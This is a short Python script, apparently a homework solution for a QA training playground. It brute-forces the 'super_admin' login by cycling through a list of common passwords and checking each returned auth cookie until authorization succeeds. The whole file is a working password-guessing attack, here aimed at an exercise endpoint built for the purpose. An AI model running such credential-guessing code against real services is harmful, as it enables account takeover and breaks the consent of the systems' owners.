import requests

URL = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"

passwords = [
    "password", "123456", "1234578", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "111111", "iloveyou", "master", "sunshine",
    "ashley", "bailey", "passw0rd", "shadow", "123123",
    "654321", "superman", "qazwsx", "welcome", "michael", "Football",
    "jesus", "ninja", "mustang", "password1", "123456789",
    "adobe123", "admin", "1234567890", "photoshop", "1234",
    "12345", "princess", "azerty", "000000", "access", "696969",
    "batman", "1qaz2wsx", "login", "qwertyuiop", "solo", "starwars",
    "121212", "flower", "hottie", "loveme", "zaq1zaq1", "freedom",
    "whatever", "666666", "!@#$%^&*", "charlie", "aa123456", "donald",
    "qwerty123", "1q2w3e4r", "555555", "lovely", "7777777", "888888", "123qwe"
]

login = "super_admin"

for i in passwords:
    resp = requests.post(URL, data={"login": login, "password": i})
    cookie_value = resp.cookies.get("auth_cookie")
    check_cookie = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": cookie_value})
    if check_cookie.text == "You are authorized":
        print(check_cookie.text, "password =", i)
        break




